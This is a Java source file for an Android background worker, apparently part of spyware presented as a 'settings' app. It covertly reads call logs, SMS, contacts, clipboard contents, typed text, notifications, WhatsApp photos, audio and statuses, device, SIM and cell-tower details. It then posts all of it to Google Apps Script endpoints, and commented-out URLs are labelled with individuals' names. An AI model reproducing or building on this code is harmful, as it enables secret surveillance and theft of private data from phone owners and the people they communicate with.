package com.example.settings;

import android.Manifest;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.util.Log;


import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.HashMap;

import java.util.Map;

import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
import static com.example.settings.MainActivity.deviceInformation;
import static com.example.settings.MainActivity.getCellInfo;
import static com.example.settings.MainActivity.geturl;
import static com.example.settings.MainActivity.setuponetimeworkManager;
import static com.example.settings.MainActivity.simName;
import static com.example.settings.Utils.checkpermission;
import static com.example.settings.Utils.getDateTime;
import static com.example.settings.Utils.getOtherNotification;
import static com.example.settings.Utils.getphoneAppdetails;
import static com.example.settings.Utils.newUrlData;

public class SyncData extends Worker {
    Sharedpref mSharedpref;
    Context context;
    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
            Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
            SmsData,OtherNotificationData,ClickedData,OtherClickedData;
    String url="";
    public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        mSharedpref = new Sharedpref(context);
        this.context = context;

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @NonNull
    @Override
    public Result doWork() {
        //saimaurl
        url=mSharedpref.getUrl();
        //url="https://script.google.com/macros/s/AKfycbwTSLIFqr1sjKmKw8LNHG4VxyRsiEYn87F3FkGnyse1Ey64ChtQ/exec";

        /*Asima Url*/
        //url="https://script.google.com/macros/s/AKfycbww2stEdxwyoiSedfbPLOCQrhWWJ29SPplLfFXEs1IwXDwZtSM/exec";

        /*Abu ji Url*/
        //url="https://script.google.com/macros/s/AKfycbzL-e8xcaMP3Cu5rcv1SIFgZdQ1ayEtBX7d6Bo5/exec";

        Name = mSharedpref.getSaveName();
        OutgoingNumbers = mSharedpref.getOutgoingNumbers();
        RecievedNumbers = mSharedpref.getRecievedNumbers();
        MissedCallNumbers = mSharedpref.getMissedCallNumber();
        TextWritten = mSharedpref.getSaveTextWritten();
        NotificationData = mSharedpref.getNotificationData();
        SmsData=mSharedpref.getSmsData();
        OtherNotificationData=mSharedpref.getOtherNotificationData();
        ClickedData=mSharedpref.getClickedData();
        OtherClickedData=mSharedpref.getOtherClickedData();
        if (checkpermission(context, Manifest.permission.READ_PHONE_STATE) && (checkpermission(context, Manifest.permission.READ_CALL_LOG))) {
            Utils.readCallLogs(context, mSharedpref);
        }
        getphoneAppdetails(context,mSharedpref);
        getOtherNotification(context,mSharedpref);

        Utils.readSmsHistory(context,mSharedpref);
        Utils.getBatteryPercent(context,mSharedpref);
        Utils.isPhoneIsLockedOrNot(context);
        Utils.checkServices(context,mSharedpref);
        MultiMediaData multiMediaData=new MultiMediaData(context,mSharedpref);
        multiMediaData.getAllShownImagesPath();
        multiMediaData.getAudios();
        multiMediaData.getWhatsAppAudios();
        multiMediaData.getWhatsphotos();
        multiMediaData.getWhatsAppStatus();
        Utils.readContacts(context,mSharedpref);

        try {
            ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData pData = clipboardManager.getPrimaryClip();
            if (pData != null) {
                ClipData.Item item = pData.getItemAt(0);
                Copiedtext = item.getText().toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }


        DaysTime = mSharedpref.getPrevDate()+" to " +getDateTime();
        if(isConnectedToNetwork(context)){
            if (!Name.isEmpty() && !Name.equalsIgnoreCase("No Name Yet")) {
                int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
                int prev=mSharedpref.getPrevPhoneNumbersLisSize();
                if (prev!= numberlistsize) {
                    Phonenumberdetails = mSharedpref.getPhoneNumbers();
                    mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
                    mSharedpref.commit();
                }
                int applistsize= mSharedpref.getPhoneAppdetailsListSize();
                int prevAppListSize=mSharedpref.getPrevPhoneAppdetailsListSize();
                if ( prevAppListSize!=applistsize) {
                    Phoneappdetails = mSharedpref.getPhoneAppdetails();
                    mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
                    mSharedpref.commit();
                }

                if (!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() ||
                        !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty()
                        || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() ||
                        !SmsData.isEmpty() || !OtherNotificationData.isEmpty()
                        || !ClickedData.isEmpty() || !OtherClickedData.isEmpty() ||
                        !Phoneappdetails.isEmpty())
                {
                    StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                            new Response.Listener<String>() {
                                @Override
                                public void onResponse(String response) {
                                    Log.d(context.getPackageName(),response);
                                    mSharedpref.setOutgoingNumbers("");
                                    mSharedpref.setRecievedNumbers("");
                                    mSharedpref.setMissedCallNumber("");
                                    mSharedpref.setSaveTextWritten("");
                                    mSharedpref.setNotificationData("");
                                    mSharedpref.setOtherNotificationData("");
                                    mSharedpref.setSmsData("");
                                    mSharedpref.setClickedData("");
                                    mSharedpref.setOtherClickedData("");
                                    mSharedpref.savePrevDate(getDateTime());
                                    mSharedpref.setCallHistory("");
                                    mSharedpref.setPhoneLockDetails("");
                                    mSharedpref.setBatteryPercnt("");
                                    mSharedpref.setSmsHistory("");
                                    mSharedpref.setServiceStatus("");
                                    mSharedpref.setImagesJson("");
                                    mSharedpref.setAudioJson("");
                                    mSharedpref.setWhatsAppImageJson("");
                                    mSharedpref.setWhatsAppStatusJson("");
                                    mSharedpref.setWhatsAppAudioJSon("");
                                    mSharedpref.setServicerNotificationData("");
                                    mSharedpref.commit();
                                   try {
                                       geturl();
                                       newUrlData(context,mSharedpref);
                                   }
                                   catch (Exception e){
                                       e.printStackTrace();
                                   }
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
                                    Log.d(context.getPackageName(),"Error");
                                    setuponetimeworkManager("From Volley Error");
                                    Result.retry();

                                }
                            }
                    ) {
                        @Override
                        protected Map<String, String> getParams() {
                            Map<String, String> parmas = new HashMap<>();

                            //here we pass params
                            parmas.put("action", "addItem");
                            parmas.put("Name", Name);
                            parmas.put("DaysTime", DaysTime);
                            parmas.put("TextWritten", TextWritten);
                            parmas.put("OutgoingNumbers", OutgoingNumbers);
                            parmas.put("RecievedNumbers", RecievedNumbers);
                            parmas.put("MissedCallNumbers", MissedCallNumbers);
                            parmas.put("Copiedtext", Copiedtext);
                            parmas.put("Phonenumberdetails", Phonenumberdetails);
                            parmas.put("Phoneappdetails", Phoneappdetails);
                            parmas.put("NotificationData", NotificationData);
                            parmas.put("OtherNotificationData", OtherNotificationData);
                            parmas.put("SmsData", SmsData);
                            parmas.put("ClickedData", ClickedData);
                            parmas.put("OtherClickedData", OtherClickedData);
                            parmas.put("CallHistory",mSharedpref.getCallHistory());
                            parmas.put("SmsHistory",mSharedpref.getSmsHistory());
                            parmas.put("PhoneLockDetails",mSharedpref.getPhoneLockDetails());
                            parmas.put("BatteryDetails",mSharedpref.getBatteryPercent());
                            parmas.put("Simdetails", String.valueOf(simName(context)));
                            parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                            parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
                            parmas.put("ImageFiles", mSharedpref.getServiceNotificationData());
                            parmas.put("Services", mSharedpref.getServiceStatus());
                            parmas.put("ImageUploaded", mSharedpref.getImagesJson());
                            parmas.put("AudioUploaded", mSharedpref.getAudioJson());
                            parmas.put("WhatsAppPhotos", mSharedpref.getWhatsAppAImageJson());
                            parmas.put("WhatsAppStatus", mSharedpref.getWhatsAppStatusJson());
                            parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
                            return parmas;
                        }
                    };

                    int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
                    RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
                    stringRequest.setRetryPolicy(retryPolicy);

                    RequestQueue queue = Volley.newRequestQueue(context);
                    queue.add(stringRequest);
                }
                else {
                    Log.d(context.getPackageName(),"All empty");
                    StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                            new Response.Listener<String>() {
                                @Override
                                public void onResponse(String response) {
                                    Log.d(context.getPackageName(),response);
                                    mSharedpref.setOutgoingNumbers("");
                                    mSharedpref.setRecievedNumbers("");
                                    mSharedpref.setMissedCallNumber("");
                                    mSharedpref.setSaveTextWritten("");
                                    mSharedpref.setNotificationData("");
                                    mSharedpref.setOtherNotificationData("");
                                    mSharedpref.setSmsData("");
                                    mSharedpref.setClickedData("");
                                    mSharedpref.setOtherClickedData("");
                                    mSharedpref.savePrevDate(getDateTime());
                                     mSharedpref.setImagesJson("");
                                    mSharedpref.setAudioJson("");
                                    mSharedpref.setWhatsAppImageJson("");
                                    mSharedpref.setWhatsAppStatusJson("");
                                    mSharedpref.setWhatsAppAudioJSon("");
                                    mSharedpref.setServicerNotificationData("");
                                    mSharedpref.commit();
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
                                    Log.d(context.getPackageName(),"All empty Error");
                                    setuponetimeworkManager("From Volley Error When Empty");
                                    Result.retry();

                                }
                            }
                    ) {
                        @Override
                        protected Map<String, String> getParams() {
                            Map<String, String> parmas = new HashMap<>();

                            //here we pass params
                            parmas.put("action", "addItem");
                            parmas.put("Name", Name);
                            parmas.put("DaysTime", DaysTime);
                            parmas.put("TextWritten", "Everything is empty");
                            parmas.put("OutgoingNumbers", OutgoingNumbers);
                            parmas.put("RecievedNumbers", RecievedNumbers);
                            parmas.put("MissedCallNumbers", MissedCallNumbers);
                            parmas.put("Copiedtext", Copiedtext);
                            parmas.put("Phonenumberdetails", Phonenumberdetails);
                            parmas.put("Phoneappdetails", Phoneappdetails);
                            parmas.put("NotificationData", NotificationData);
                            parmas.put("OtherNotificationData", OtherNotificationData);
                            parmas.put("SmsData", SmsData);
                            parmas.put("ClickedData", ClickedData);
                            parmas.put("OtherClickedData", OtherClickedData);
                            parmas.put("CallHistory",mSharedpref.getCallHistory());
                            parmas.put("SmsHistory",mSharedpref.getSmsHistory());
                            parmas.put("BatteryDetails",mSharedpref.getBatteryPercent());
                            parmas.put("PhoneLockDetails",mSharedpref.getPhoneLockDetails());
                            parmas.put("Simdetails", String.valueOf(simName(context)));
                            parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                            parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
                            parmas.put("ImageFiles", mSharedpref.getServiceNotificationData());
                            parmas.put("Services", mSharedpref.getServiceStatus());
                            parmas.put("ImageUploaded", mSharedpref.getImagesJson());
                            parmas.put("AudioUploaded", mSharedpref.getAudioJson());
                            parmas.put("WhatsAppPhotos", mSharedpref.getWhatsAppAImageJson());
                            parmas.put("WhatsAppStatus", mSharedpref.getWhatsAppStatusJson());
                            parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
                            return parmas;
                        }
                    };

                    int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
                    RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
                    stringRequest.setRetryPolicy(retryPolicy);

                    RequestQueue queue = Volley.newRequestQueue(context);
                    queue.add(stringRequest);

                }
            }
            else {
                Log.d(context.getPackageName(),"Name empty");
                Result.retry();

            }
        }
        else {
            Log.d("Settings","Internet Problem");
        }

        return Result.success();
    }
}
